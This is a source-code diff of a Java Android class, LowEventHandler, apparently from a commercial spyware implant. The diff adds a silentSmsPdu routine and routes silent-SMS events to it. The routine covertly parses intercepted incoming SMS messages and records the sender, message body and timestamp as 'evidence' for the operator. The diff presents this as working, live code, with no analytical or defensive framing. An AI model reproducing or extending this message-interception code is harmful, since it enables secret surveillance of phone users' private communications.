@@ -1,22 +1,24 @@
 package com.android.dvci.util;
 import android.net.LocalServerSocket;
 import android.net.LocalSocket;
-import android.os.RemoteException;
 import android.telephony.SmsMessage;
 import android.util.Log;
-
 import com.android.dvci.auto.Cfg;
-
+import com.android.dvci.evidence.EvidenceBuilder;
+import com.android.dvci.evidence.EvidenceType;
+import com.android.dvci.module.ModuleMessage;
+import com.android.mm.M;
 import java.io.BufferedInputStream;
 import java.io.BufferedOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
-import java.io.OutputStream;
-import java.util.HashMap;
+import java.util.Date;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 /**
  * Created by zad on 27/02/15.
@@ -102,13 +104,75 @@ public class LowEventHandler implements Runnable {
 		}
 		return callOrig;
 	}
-	public static int dispatchNormalMessagePdu(byte[] pdus) {
+	public static int silentSmsPdu(LowEvent<byte[]> lsms) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "silentSmsPdu: start ok ");
+		}
+		int callOrig = 1;
+		if (lsms.data.length==0) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "silentSmsPdu: pdus zero size ");
+			}
+			return callOrig;
+		}
+
+		try {
+			final SmsMessage sms = SmsMessage.createFromPdu(lsms.data);
+			ScheduledExecutorService exec = Executors.newScheduledThreadPool(1);
+
+			exec.schedule(new Runnable(){
+				@Override
+				public void run(){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "silentSmsPdu: saving evidence " + sms.getMessageBody());
+					}
+					String from, to;
+					final String address = sms.getOriginatingAddress();
+					final byte[] body = WChar.getBytes(sms.getMessageBody());
+					final long date = sms.getTimestampMillis();
+					final boolean sent = false;
+					int flags;
+
+					if (sent) {
+						flags = 0;
+						from = M.e("local"); //$NON-NLS-1$
+						to = address;
+					} else {
+						flags = 1;
+						to = M.e("local-silent"); //$NON-NLS-1$
+						from = address;
+					}
+
+					final int additionalDataLen = 48;
+					final byte[] additionalData = new byte[additionalDataLen];
+
+					final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
+					databuffer.writeInt(ModuleMessage.SMS_VERSION);
+					databuffer.writeInt(flags);
+
+					final DateTime filetime = new DateTime(new Date(date));
+					databuffer.writeLong(filetime.getFiledate());
+					databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
+					databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
+					EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));
+
+				}
+			}, 1, TimeUnit.SECONDS);
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "silentSmsPdu: Exception:", e);
+			}
+		}
+		return callOrig;
+	}
+	public static int dispatchNormalMessagePdu(LowEvent<byte[]> lsms) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "dispatchNormalMessagePdu: start ok ");
 		}
 		int callOrig = 1;
-		if (pdus.length==0) {
+		if (lsms.data.length==0) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "dispatchNormalMessagePdu: pdus zero size ");
 			}
@@ -116,9 +180,7 @@ public class LowEventHandler implements Runnable {
 		}
 
 		try {
-
-			SmsMessage sms = SmsMessage.createFromPdu(pdus);
-
+			SmsMessage sms = SmsMessage.createFromPdu(lsms.data);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "dispatchNormalMessagePdu: processing " + sms.getMessageBody());
 			}
@@ -180,11 +242,14 @@ public class LowEventHandler implements Runnable {
 							ObjectInputStream ois = new ObjectInputStream(streamIn);
 							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
 							Log.d(TAG, "GOT DATA " + event);
-							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS) {
-
-
+							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS || event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT) {
 								if (event.data != null) {
-									event.res = dispatchNormalMessagePdu((byte[])event.data);
+									LowEvent<byte[]> sms_event = new LowEvent<byte[]>(event);
+									if( event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT){
+										event.res = silentSmsPdu(sms_event);
+									}else {
+										event.res = dispatchNormalMessagePdu(sms_event);
+									}
 								} else {
 									event.res = 1;
 								}
